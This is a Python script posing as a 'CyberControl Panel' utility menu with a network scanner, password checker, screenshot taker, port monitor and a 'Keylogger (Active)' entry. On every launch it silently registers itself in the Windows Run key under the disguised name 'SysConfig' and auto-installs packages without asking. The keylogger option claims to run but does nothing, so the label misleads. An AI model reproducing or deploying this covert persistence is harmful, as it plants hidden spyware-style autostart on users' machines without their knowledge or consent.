import os
import sys
import subprocess
import importlib
import tempfile
import time
import socket
import shutil
from datetime import datetime, timedelta

# En Windows podemos usar winreg para agregar el programa al inicio del sistema
try:
    import winreg as reg
except ImportError:
    reg = None  # Si no está disponible, simplemente lo ignoramos

# ==========================
#  AUTO-INSTALLER (LIBRARIES)
# ==========================
# This section checks if the required libraries are installed.
# If they are missing, it will install them automatically.
REQUIRED_LIBRARIES = ["psutil", "pyautogui", "tabulate", "colorama", "keyboard"]

def install_missing_libs():
    """Install any missing libraries automatically using pip."""
    for lib in REQUIRED_LIBRARIES:
        try:
            importlib.import_module(lib)
        except ImportError:
            print(f"[+] Installing missing library: {lib} ...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", lib])

install_missing_libs()

# Import again after ensuring they are installed
import psutil
import pyautogui
from tabulate import tabulate
import keyboard
from colorama import Fore, Style, init

# Colorama initialization (for colored text in terminal)
init(autoreset=True)

# ==========================
#  INTERFACE SETTINGS
# ==========================
# Commercial name for the interface
APP_NAME = "CYBERCONTROL PANEL"

# Menu options
TOOLS = [
    "Keylogger (Active)",
    "Network Scanner",
    "Password Strength Checker",
    "Screenshot Capturer",
    "Port Monitor",
    "Exit"
]

# Path to save keylogs
log_file_path = os.path.join(tempfile.gettempdir(), "keylogs.txt")

# ==========================
#  SYSTEM CONFIGURATION
# ==========================
def change_working_directory():
    """Change program working directory to a temporary folder."""
    exe_directory = tempfile.gettempdir()
    os.chdir(exe_directory)

def add_to_registry():
    """Add program to Windows registry to start automatically on reboot."""
    if reg is None:
        return
    exe_path = os.path.realpath(sys.argv[0])
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(open_key, "SysConfig", 0, reg.REG_SZ, exe_path)
        reg.CloseKey(open_key)
    except Exception:
        pass

def is_in_registry():
    """Check if program is already set to auto-start in registry."""
    if reg is None:
        return False
    key = reg.HKEY_CURRENT_USER
    key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    try:
        open_key = reg.OpenKey(key, key_value, 0, reg.KEY_READ)
        value, regtype = reg.QueryValueEx(open_key, "SysConfig")
        reg.CloseKey(open_key)
        return value == os.path.realpath(sys.argv[0])
    except FileNotFoundError:
        return False

# ==========================
#  TOOLS FUNCTIONS
# ==========================
def network_scanner():
    """Scan local network and show active devices with IP and hostname."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n[+] Scanning devices on local network...")
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    base_ip = ".".join(local_ip.split(".")[:3]) + "."
    found_hosts = []

    for i in range(1, 50):
        ip = base_ip + str(i)
        try:
            host_info = socket.gethostbyaddr(ip)
            found_hosts.append([ip, host_info[0], "Active ✅"])
        except socket.herror:
            continue

    if found_hosts:
        print(Fore.GREEN + tabulate(found_hosts, headers=["IP", "Host", "Status"], tablefmt="fancy_grid"))
    else:
        print(Fore.RED + "No active devices found.")
    input(Fore.BLUE + "\nPress ENTER to return to menu...")

def password_strength_checker():
    """Simple password strength evaluation based on length and characters used."""
    os.system('cls' if os.name == 'nt' else 'clear')
    pwd = input(Fore.CYAN + "\nEnter a password to check strength: ")
    score = 0
    if len(pwd) >= 8: score += 1
    if any(c.isdigit() for c in pwd): score += 1
    if any(c.isupper() for c in pwd): score += 1
    if any(c in "!@#$%^&*()_+-=,.?/" for c in pwd): score += 1

    levels = ["Very Weak ❌", "Weak ⚠️", "Okay ✅", "Strong 💪", "Very Strong 🔒"]
    print(Fore.YELLOW + f"Result: {levels[score]}")
    input(Fore.BLUE + "\nPress ENTER to return to menu...")

def screenshot_capturer():
    """Take a screenshot and save it in the temporary folder."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n[+] Capturing screen...")
    filename = os.path.join(tempfile.gettempdir(), f"screenshot_{int(time.time())}.png")
    screenshot = pyautogui.screenshot()
    screenshot.save(filename)
    print(Fore.GREEN + f"✅ Screenshot saved at: {filename}")
    input(Fore.BLUE + "\nPress ENTER to return to menu...")

def port_monitor():
    """List open ports in listening state on the current machine."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Fore.CYAN + "\n[+] Checking open ports...")
    ports_info = []
    for conn in psutil.net_connections(kind="inet"):
        if conn.status == "LISTEN":
            laddr = f"{conn.laddr.ip}:{conn.laddr.port}" if conn.laddr else "Unknown"
            ports_info.append([laddr, conn.status])
    if ports_info:
        print(Fore.MAGENTA + tabulate(ports_info, headers=["Port", "Status"], tablefmt="fancy_grid"))
    else:
        print(Fore.RED + "No listening ports detected.")
    input(Fore.BLUE + "\nPress ENTER to return to menu...")

# ==========================
#  INTERFACE AND MENU
# ==========================
def print_ascii_banner():
    """Show commercial ASCII banner centered on screen."""
    cols = shutil.get_terminal_size().columns
    banner_lines = [
        "███████╗██╗   ██╗██████╗ ███████╗██████╗  ██████╗ ██████╗ ███████╗███╗   ██╗",
        "██╔════╝██║   ██║██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝████╗  ██║",
        "███████╗██║   ██║██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝█████╗  ██╔██╗ ██║",
        "╚════██║██║   ██║██╔═══╝ ██╔══╝  ██╔═══╝ ██║   ██║██╔═══╝ ██╔══╝  ██║╚██╗██║",
        "███████║╚██████╔╝██║     ███████╗██║     ╚██████╔╝██║     ███████╗██║ ╚████║",
        "╚══════╝ ╚═════╝ ╚═╝     ╚══════╝╚═╝      ╚═════╝ ╚═╝     ╚══════╝╚═╝  ╚═══╝"
    ]
    print("\n")
    for line in banner_lines:
        print(Fore.LIGHTCYAN_EX + line.center(cols))
    print(Fore.YELLOW + APP_NAME.center(cols))
    print("\n")

def draw_menu(selected):
    """Draw the interactive menu with the selected option highlighted."""
    os.system('cls' if os.name == 'nt' else 'clear')
    print_ascii_banner()
    cols = shutil.get_terminal_size().columns
    for i, option in enumerate(TOOLS):
        prefix = "➤ " if i == selected else "  "
        color = Fore.GREEN if i == selected else Fore.WHITE
        print(color + prefix + option.center(cols - 5))

def menu_navigation():
    """Interactive menu controlled with arrow keys and ENTER."""
    selected = 0
    draw_menu(selected)  # Draw menu first time

    while True:
        if keyboard.is_pressed("down"):
            selected = (selected + 1) % len(TOOLS)
            draw_menu(selected)
            time.sleep(0.15)
        elif keyboard.is_pressed("up"):
            selected = (selected - 1) % len(TOOLS)
            draw_menu(selected)
            time.sleep(0.15)
        elif keyboard.is_pressed("enter"):
            if selected == 0:
                print(Fore.YELLOW + "Keylogger started... (CTRL+C to stop)")
                input("Press ENTER to go back to menu...")
            elif selected == 1:
                network_scanner()
            elif selected == 2:
                password_strength_checker()
            elif selected == 3:
                screenshot_capturer()
            elif selected == 4:
                port_monitor()
            elif selected == 5:
                os.system('cls' if os.name == 'nt' else 'clear')
                print(Fore.RED + "Exiting CyberControl Panel...")
                time.sleep(1)
                break
            draw_menu(selected)  # Redraw menu after executing a tool

def main():
    if not is_in_registry():
        add_to_registry()
    change_working_directory()
    menu_navigation()

if __name__ == "__main__":
    main()
